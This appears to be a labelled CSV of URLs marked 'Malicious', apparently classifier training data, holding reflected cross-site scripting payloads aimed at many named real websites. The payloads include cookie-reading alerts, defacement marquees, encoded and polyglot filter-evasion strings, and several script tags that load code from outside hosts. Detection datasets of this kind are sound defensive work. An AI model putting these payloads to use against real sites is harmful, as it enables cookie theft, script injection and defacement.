http://hms.harvard.edu/faculty-search/?firstname=%3c/h2%3e%3cscript%3ealert%28/xss/%29%3c/script%3e&lastname=%3cscript%3ealert%28/xss2/%29%3c/script%3e&s=1,Malicious
http://fr.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://www.emcdda.europa.eu/www/advancedsearch.cfm?ssearchtext=%3cscript%3ealert('xssed by<br>roach189')%3c/script%3e,Malicious
http://www.nationalgallery.co.uk/shop/search.asp?sitelanguage=%22%3e%3cscript%3ealert('by%20encore')<br>%3c/script%3e,Malicious
"http://www2.uol.com.br/parisdakar/fotos2004.htm?dakar2004_1501_22.jpg?&lt;script&gt;alert(string.fromcharc<br>ode(88,83,83,32,98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,103,98,<br>117,115,116,101,114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://www.ismididikle.com/showisim.php?isim=%22%3e%3cscript%20src=http://byccc.awardspace.com/js/xs<br>sccc.js%3e%3c/script%3e,Malicious
http://www.amazon.com/gp/daily/ref=%22/%3e%3cscript%3ealert('xss%20$4.99%20+%20s&amp;h')%3c/script%3e,Malicious
http://shop.arsenal.com/arsenal/sub_dept.asp?dept_id=%22%3e%3cscript%3ealert('0ssi3_tr')%3c/script%3<br>e,Malicious
http://search.access.gpo.gov/compliance/search.asp?ct=compliance&amp;q1=%3cscript%3ealert(%22iblaze%22)%<br>3c%2fscript%3e,Malicious
http://www.connections.be/weekendesk/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%<br>3e%3cmarquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.stefanpetrescu.com/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://touch.afisha.mail.ru/%22%3e%3cscript%3ealert%28%22xss_by_c37hun%22%29%3c/script%3e,Malicious
http://www.harrisontpitre.org/htp/gal/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.nissan.com.sg/contactus/contactus.cfm?error=&lt;script%20%0a%0d&gt;alert('xss%20by%20turkpower%<br>20-%20from%20turkey')%3b&lt;/script&gt;&amp;type=1,Malicious
http://www.maib.tas.gov.au/search.asp?keyword=%3c/xmp%3e%22%3e%3cscript%3ealert(123)%3c/script%3e&amp;x=<br>0&amp;y=0&amp;new=true&amp;type%5b%5d=subsector&amp;field=text,Malicious
http://www.in.gov/ism/search.aspx?ssearch=&lt;iframe src=http://google.com&gt;&lt;/iframe&gt;&lt;script<br>src=http://ha.ckers.org/xss.js?/&gt;,Malicious
http://www.interdys.org/search.aspx?search=%22%3e%3cscript%3ealert(%22i%20can%20read!!!!!!%22)%3c%2f<br>script%3e&amp;image.x=0&amp;image.y=0,Malicious
http://www.parl.gc.ca/information/about/people/key/pm/index.asp?language=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/<br>script&gt;,Malicious
http://www.idlewords.net/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://public.nhlbi.nih.gov/newsroom/home/getpressrelease.aspx?id=2554%3e%3cscript%3ealert(1337)%3c/<br>script%3e,Malicious
http://fr.brothersoft.com/search.php?lang=fr&amp;s=%22%3e%3cmarquee%3e%3ch1%3edefaced+by+ironzorg%3c%2fh<br>1%3e%3c%2fmarquee%3e,Malicious
http://www.findikkurdu.com/forum/uyebilgi.asp?uye=%3cscript+src=http://starext.by.ru/lt.js%3e%22%3e%<br>3ch1%3exss,Malicious
http://www.dekooter.nl/fotos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcotic<br>xs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://ms139.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.manutd.com/default.sps?pagegid=%7b588cea1a-302c-4d0d-bb3f-b47634e059c9%7d&amp;st=1&amp;lk=1&amp;rf=1&amp;<br>dt=an&amp;nh=10&amp;col=manu&amp;qs=&amp;qt=%27%3balert%28document.cookie%29%2f%2f%5c%27%3balert%281%29%2f%2f%22%3ba<br>lert%282%29%2f%2f%5c%22%3balert%283%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3c%2ftitle%3e%3cscript%<br>3ealert%284%29%3c%2fscript%3e%3d%26%7b%3c%2ftitle%3e%3cscript%3ealert%28%27g%fcnaydin+kanka+%3ad%27%<br>29%3c%2fscript%3e%7d%22%29%3b%7d,Malicious
http://www.help.gv.at/suche/ergebnis?such_stichwort=%27&amp;bereich=help&amp;such=suchen&amp;bereich=ls&amp;zielgrup<br>pe=buerger&amp;id=-1%27%22%3e%3cscript%3ealert(%27xssed%20by%20viper.at%27)%3c/script%3e&amp;sprache=de,Malicious
http://fletchersite.com/classifieds/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://php.finance.sina.com/apply/symbol.php?country=us&amp;charset=big5&amp;kanjitype=c&amp;symbol=%22%3e%27%3e<br>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%27%58%27%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.bakeru.edu/library/searchcat.php?category=business%22%3e%22%3e/r0hit/%3e%3cscript%3ealert<br>(document.cookie)%3c/script%3e%3cscript%20src=http://iblog.ir/style.js%3e%3c/script%3e,Malicious
http://www.qrendi.gov.mt/pages/searchresults.asp?txtsearch='%3e%22%3e%3cscript/src=http://kusomiso.c<br>om/xss.js%3e%3c/script%3e,Malicious
http://www.bbc.co.uk/portuguese/avconsole/player/player.shtml?lang=pt-br&amp;title=&lt;script&gt;alert('xss%20<br>by%20bugbuster')&lt;/script&gt;&amp;clipurl=lala!asx&amp;cs=news&amp;lp=0&amp;mt=v,Malicious
http://www.next-up.org/main.php?param=%22%3e%3cmarquee%3e%3ch1%3edefaced%20by%20ironzorg%3c/h1%3e%3c<br>/marquee%3e,Malicious
http://lists.cpan.org/showlist.cgi?name=%3cmarquee%3e%3ch1%3edefaced%20by%20ironzorg%3c/h1%3e%3c/mar<br>quee%3e,Malicious
http://www.garzantigrandiopere.it/ggo/catalogo/search.jsp?q=gotcha&amp;m=&amp;t=&amp;a=%22%3e%3cscript%3ealert%2<br>8%27brought+to+you+by+xscoffee%27%29%3c%2fscript%3e%3cbr%3e%3c%2ftd%3e%3c%2ftr%3e%3ctr%3e%3ctd%3e%3c<br>%2ftd%3exss+by%3a%3c%2ftr%3e%3cinput+type%3d%22text%22+value%3d%22xscoffee,Malicious
"http://cienciahoje.uol.com.br/controlpanel/materia/search.do?rmid=809&amp;query=&lt;script&gt;alert(string.fro<br>mcharcode(88,83,83,32,98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,117,1<br>03,98,117,115,116,101,114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://www.streamate.com/search.php?exact=1&amp;keys=0%3a504%3b10%3a512&amp;&amp;title=redhead+girl+cams%27%22%3<br>e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://ms144.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.punjab-zameen.gov.pk/details.php?submenuid=1&amp;menuid=1%22%3e%3cscript%3ealert%28%22xssed%2<br>0by%20prashant%22%29%3c/script%3e,Malicious
http://www2.lancome.com/_int/_en/catalog/subcategory.aspx?categorycode=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious
http://www.turkishdailynews.com.tr/login.php?redirectto=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.ubuntu.com/getubuntu/downloading?release=desktop-newest&amp;arch=amd64&amp;mirror=';alert(string.<br>fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,8<br>3,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(str<br>ing.fromcharcode(88,83,83))%3c/script%3e&amp;debug=&amp;download-button=",Malicious
http://icwalsall.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org/<br>)%3c/script%3e%3cp,Malicious
http://www.cissp.com/store/search.asp?s=%22%3cscript%3ealert('xss%20froms%20sshjason');%3c/script%3e<br>&amp;c=135315,Malicious
http://bondfaro.click21.com.br/bondfaro/in/productselect_in.jsp?text=&lt;script&gt;alert(&quot;xroot owned<br>you!&quot;)&lt;/script&gt;,Malicious
http://www.kouanimo.com/search.php?cat=&amp;keyword=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3<br>cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;image.x=0&amp;image.y=0&amp;opt=0,Malicious
http://chat.paltalk.com/g2/webapp/search/searchgroups.wmt?searchkey=%27%3e%22%3e%3cscript%2fsrc%3dht<br>tp%3a%2f%2fkusomiso.com%2fxss.js%3e%3c%2fscript%3e&amp;selectapp=groups,Malicious
"http://adspecs.yahoo.fr/wp-content/plugins/spectacular/ajax.php?ys_action=addtocart&cb=0&pgid=0&prop=0>""><script>alert(document.cookie);</script>",Malicious
http://my.imageshack.us/registration/index.php?user=&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88)<br>)&lt;/script&gt;,Malicious
http://seatransport.e-transport.gov.gr/error.asp?errormessage=%3cscript%3ealert%28string.fromcharcod<br>e%2883%2c116%2c64%2c82%2c45%2c103%2c97%2c90%2c51%2c114%29%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3est%4<br>0r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.thomashoornstra.nl/stamboom/gastenboek/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ketenlik.gr/fotoigaleri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.technologyreview.com/search.aspx?s=%3cscript%3ealert(%22aze%22)%3c%2fscript%3e&amp;search.x=0<br>&amp;search.y=0,Malicious
http://www.ethnos.gr/default.asp?catid=11807&amp;tag=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/xss%20by%20turkpower%20-<br>%20from%20turkey/)%3b&lt;/script&gt;&lt;h1&gt;xss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20hellas%20:d<br>&lt;/h1&gt;,Malicious
http://webcast.berkeley.edu/events.php?p=1&amp;ipp=1000&amp;category=%3c/title%3e%3cscript%3ealert(1);%3c/sc<br>ript%3e,Malicious
http://www.premiere.de/premweb/common/schnellsuche/boundary/schnellsucherh.do?forward_success=%2fpre<br>mweb%2fcms%2fde%2fprogramm_tv-guide_detailsuche_5241.jsp&amp;searchstring=%22%3e%3cscript%3ealert%281%29<br>%3c%2fscript%3e,Malicious
http://search.zol.com.cn/s/search.php?keyword=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%<br>22%27&amp;x=0&amp;y=0,Malicious
http://momschool.yahoo.co.kr/outing/list.php?page=2&amp;search=&amp;key=&amp;gubun=%22%3e%3cscript%3ealert%28%2f<br>www.r3t.n3t.nl%2f%29%3c%2fscript%3e,Malicious
"http://anno.it.ubi.com/pc/media1404.php?gallery=media1404&amp;picture=%27%22%3e%3cscript%3ealert%28strin<br>g.fromcharcode%2888,83,83,69,68,32,98,121,32,86,105,112,101,114,46,97,84%29%29;document.write%28stri<br>ng.fromcharcoe%2860,97,32,104,114,101,102,61,34,104,116,116,112,58,47,47,120,115,115,101,100,46,99,1<br>11,109,47,97,114,99,104,105,118,101,47,97,117,116,104,111,114,61,86,105,112,101,114,46,97,84,47,34,6<br>2,88,83,83,69,68,60,47,97,62%29%29;%3c/script%3e",Malicious
http://www.hospitality-industry.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.<br>cookie)&lt;/script&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://s1xty0n3.awardspace.com/coklukayit/?d=8%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.skkladno.cz/index.php?rubrika='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarque<br>e%3ewhitehat%20forever%3c/marquee%3e&amp;rubrika2='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cm<br>arquee%3ewhitehat%20forever%3c/marquee%3e,Malicious
http://www.wetmummy.com/video.php?search=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://www.mindtools.com/corp/index2.php?h1=management%20training&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://wildcat.arizona.edu/media/storage/paper997/news/2008/10/20/news/shooting.near.old.main.this.m<br>orning-3495141.shtml%7d%3c/style%3e%3cscript%3ea=eval%3bb=alert%3ba(b(/xss/.source))%3b%3c/script%3e<br>%7d%3c/style%3e%3cscript%3ea=eval%3bb=alert%3ba(b(/xss/.source))%3b%3c/script%3e,Malicious
http://www.atoomic.com/search.php?request=%3d%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscrip<br>t%3e%3ch1%3efujked%3c%2fh1%3e&amp;lng=en,Malicious
http://java.sun.com/javaee/downloads/index.jsp?userosindex=6&amp;userosid=windows&amp;userosname=windo%27%22<br>%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3ews,Malicious
"http://www.live365.com/cgi-bin/directory.cgi?searchdesc=&quot;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharc<br>ode(88,83,83))&lt;/script&gt;&lt;&amp;i1=",Malicious
http://www.kitchenaid.com/catalog/search.jsp?n=5&amp;ntk=prodkeywordsearch&amp;ntx=mode+matchallpartial&amp;ntt=<br>'%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.buddha.mil.kr/community/planjr2.jsp?top_menu_idx=2&amp;sub_menu_idx=2&amp;seq=33%27%22%3e%3c/titl<br>e%3e%3cscript%3ealert(1337)%3c/script%3e13,Malicious
http://www.cleaner-production.de/suchergebnisse/?tx_frommosearch_pi1[sword]=%22%3e%3cscript%3ealert%28%27guess_we_are_behind_enemy_lines%27%29%3c/script%3e,Malicious
https://www.saoleopoldo.rs.gov.br/home/show_page.asp?categoria=busca?id_conteudo=&amp;codid_cat=10&amp;imgca<br>t=tema_prefeitura.jpg&amp;procurar=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e&amp;bfind.x=16&amp;bfin<br>d.y=12,Malicious
http://insulincongress.org/search.cfm?searchtext=%3e%3cscript%3ealert(%22xssed%20by%20azat%22)%3c/sc<br>ript%3e,Malicious
"http://researchguides.case.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';al<br>ert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromchar<br>code(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://escrow-fraud.com/search.php?search=%3cscript%3ealert%28%27xylitol+for+xssed.com%27%29%3c%2fsc<br>ript%3e&amp;submit=submit,Malicious
http://www.alienvault.com/company.php?section=contactus&amp;country=%22%3e%3cscript%3ealert(document.coo<br>kie)%3c/script%3e,Malicious
http://www.3000mb.com/cgi-bin/xpanel/amanager.cgi?persistent=&amp;login=%22%3e%3cscript%3ealert%28%27hac<br>king-gurus.com+pwned+by+%21%21neo%21%21+hacking-gurus.com%27%29%3c%2fscript%3e%3cimg+src%3d%22http%3<br>a%2f%2fimg149.imageshack.us%2fimg149%2f1232%2flogonj5.gif%22%3e%3c&amp;passwd=&amp;action=log+in,Malicious
http://www.employmentflyers.org/search.html?query=%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/s<br>cripts/hotpockets.js%3e,Malicious
http://support.onsite.no/esupport/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(docu<br>ment.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://www.kaboodle.com/beringia/0.html?v=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.crazyfinjas.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.istadia.com/articlesearchresults.php?query=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3<br>e,Malicious
http://www.unionzeiss.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ifoods.tv/web/search.jsp?search=pork%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scrip<br>t%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
https://signup.onetel.co.uk/amb/login.php?refurl=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22<br>%41%6d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e,Malicious
http://www.portalrh.com.ar/php/main.php?p=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%<br>2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharcode%2<br>888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3c%2fs<br>cript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e%3d%2<br>6%7b%7d%22%3e%3cscript+src%3dhttp%3a%2f%2fckers.org%2fs%3e&amp;x=37&amp;y=8,Malicious
http://www.ornl.gov/info/press_releases/get_press_release.cfm?releasenumber=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;<br>)&lt;/script&gt;,Malicious
http://faq-avast.com/faq/all_print.php?prog=1&amp;lang=fr&amp;layout=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://noticias.click21.com.br/publicador/click21/admin/enviar.php?id_artigo=&quot;&gt;&lt;script&gt;alert(string.<br>fromcharcode(88,83,83,32,98,121,32,66,117,103,66,117,115,116,101,114,32,45,32,76,101,105,97,32,98,11<br>7,103,98,117,115,116,101,114,46,99,111,109,46,98,114));&lt;/script&gt;",Malicious
http://www.e-hack.org/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%3ealert(<br>document.cookie)%3b%3c/script%3e,Malicious
http://search.boston.com/local/search.do?s.tab=yp&amp;s.sm.query=&amp;s.ypsearch=wawa%22%3e%27%3e%3cu%3exx&amp;s<br>.yplocation=%22%3e%3ciframe+src%3djavascript%3aalert(123)%3e&amp;when=&amp;qf=&amp;qn=&amp;qc=&amp;qs=&amp;s.si(simplesearch<br>input).sortby=&amp;s.daterange=,Malicious
http://stadtplan.frankfurt.de/radroutenplaner/start.jsp?gg_list=0&amp;city_list=0&amp;select=street&amp;street_s<br>earch=totalschaden%22%3e%3cscript%3ealert%28%22totalschaden%22%29%3c%2fscript%3e,Malicious
http://oyun.ekolay.net/rumuz_aramasonuc.asp?rumuz_ara=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://search.tom.com/search.php?word=%3c/title%3e%3cscript%3ealert%28%27i-landet%27%29%3c/script%3e<br>&amp;edt=,Malicious
http://www.zicam.com/search/node/%22%3e%3cscript%3ealert%281337%29%3c/script%3e,Malicious
http://iclanarkshire.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.<br>org/)%3c/script%3e%3cp,Malicious
http://cojedes.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scr<br>ipt%3e,Malicious
http://www.leechvideo.com/search/%3cmarquee%3e%3ch1%3exss_by_uber0n,Malicious
https://www.comodo.com/buy-ssl/select-ssl.php?ssl=%3cscript%3ealert%28@_@%29%3c/script%3e%27%22%3e%3<br>cscript%3ealert%28document.cookie%29%3c/script%3e%3ciframe%20src%20=http://www.youtube.com/watch?v=x<br>xpl8xicjrc%22%20width=%221480%22%20height=%221435%22%20\%3e%3c/div%3e,Malicious
http://www.boehringer-ingelheim.fr/search/index.jsp?qt=+%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(%22<br>xss%22)%3b%3c%2fscript%3e%3cmarquee,Malicious
http://www.roadsafetyni.gov.uk/index/search.jsp/search.lsim?cs=iso-885%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e9-1&amp;ha=r<br>oadsafety&amp;mt=1&amp;nh=10&amp;qt=relevance&amp;sc=&amp;sm=0&amp;sr=0&amp;x=1,Malicious
http://www.camden.gov.uk/print/ccm/content/business/small-business/languages/turkish/konsey-halesi-n<br>asl-alnr-how-to-get-a-council-contract.en?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://pravo.fso.gov.ru/search/index.html?action=search&amp;advanced=true&amp;searchpage=1&amp;query=/&quot;&gt;&lt;script&gt;<br>alert('xss by atm0n3r')&lt;/script&gt;&amp;search=%d0%9d%d0%b0%d0%b9%d1%82%d0%b8&amp;plugin=1001&amp;search.root=%2f,Malicious
http://www.bafrahaber.com/bafra_resim/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://iis.dip.jp/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.consum8.com/search.php?q=%3c%3cscript%3ealert(%22resistance%22);//%3c%3c/script%3e,Malicious
http://www.marychild.dk/news_details.php?id=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e<br>%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://mlb.mlb.com/team/player.jsp?player_id=134321%22%3e%3e%3c/script%3e%3cscript%3ealert(666666666<br>666666666666666666)%3c/script%3e,Malicious
http://www.insee.fr/fr/ffc/recherche.asp?rempli=oui&amp;b_nat=on&amp;id_reg=&amp;mot_cle=&amp;titre=%22%3e%27%3e%3cs<br>cript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e&amp;publi=<br>&amp;ok=rechercher&amp;num_pub=&amp;deb_mois=&amp;deb_annee=&amp;fin_mois=&amp;fin_annee=&amp;auteur=,Malicious
http://brasil.peugeot.com.br/rede/index.do?method=%3cscript%3ealert('xssed')%3c/script%3e,Malicious
http://metablog.onekoreanews.net/index.php?type=all&amp;keyword=%22%3e%3cscript%3ealert(/xss/)%3c/script<br>%3e,Malicious
http://cesu.utk.edu/photos/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.houra.fr/index.php?a=valid&amp;destination=%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e,Malicious
http://www.somsak2004.net/hot/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://keznews.com/search?s=vista+sp1+crack&amp;s_what='&quot;&gt;&lt;/script&gt;&lt;iframe/src=http://xssed.com&gt;&lt;h1&gt;hack<br>ed+by+trex&lt;/h1&gt;,Malicious
http://www.lol.1960.50megs.com/catalog.html%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
"http://www.obesityhelp.com/search/tab,search_oh/action,search_oh/?q=%22%3e%3cscript%3ealert(%22you+w<br>ant+help+with+obesity%3f+stop+eating!%22)%3c%2fscript%3e&amp;cx=000946886326336472648%3ae-vpeg4uyxw&amp;cof=<br>forid%3a9&amp;x=0&amp;y=0#859",Malicious
http://quotes4all.net/quotes/search.html?query=%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://www.presidency.gr/hmerologio.asp?search_ok=1&amp;fromtable=&amp;rid=&amp;categ=&amp;gencatonly=&amp;find_spec=%22<br>%3cscript%3ealert%28%2fst%40r-gaz3r%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c%2fh1%3e<br>%3c%2fmarquee%3e&amp;typei=0&amp;date_start=&amp;date_end=,Malicious
http://www.worldpay.com/search/search.php?query=bibit&amp;start=85&amp;search=1&amp;results=10%22%27/%3e%3cscrip<br>t%3ealert%28%27xss%27%29%3c/script%3e,Malicious
http://esa.un.org/esaweb/referenceservice/inventory/pgviewactivities.asp?titlestring=&lt;script&gt;alert('<br>xssed%20lol%20:)%20');&lt;/script&gt;,Malicious
http://www.874117.com/?action=login&amp;agid=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
https://steamcommunity.com/?goto=%20%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22);%3c/script%3e%<br>3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://touch.tv.mail.ru/%22%3e%3cscript%3ealert%28%22xss_by_c37hun%22%29%3c/script%3e,Malicious
http://www.anti-piracy.be/fr/indexb.php?n=1&amp;message=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29<br>%3c/script%3e,Malicious
http://www.bmgaia.net/docbweb/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;script<br>&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.oceanicengineering.org/main.cfm?id=&quot;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&lt;iframe%20s<br>rc=http://xssed.com&gt;,Malicious
http://www.odew.net/2-=%22%3e%3cscript%3ealert(%22backdoor%22)%3c/script%3e.htm,Malicious
http://www.cm-coimbra.pt/bmc/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols=2&amp;<br>form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.cookislands.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://www.adobe.com/cfusion/tdrc/modal/signin.cfm?loc=en_us&product=""""</script><script>alert%28document.cookie%29</script><script>",Malicious
https://bankingportal.sparkasse-giessen.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de<br>%3e,Malicious
http://1.dcsp.jp/pass.php?mode=pass&amp;id=%22%3e%3cbody%20onload%3dalert%28%27kusomiso%2ecom%27%29%3e&amp;m<br>ail=,Malicious
http://up2.viploader.net/upphp/link.php?updir='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c<br>/script%3e&amp;file=xss_by_kusomiso.com,Malicious
http://siproquim.dpf.gov.br/spq/menu.jsp?op=%22%3e%3cscript%3ealert('xssed')%3c/script%3e,Malicious
http://www.myinfosecjob.com/?s=%22%3e%3cscript%3ealert%28%27zer0%20security%27%29%3c%2fscript%3e,Malicious
https://www.universityyachtclub.org/photo_album/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
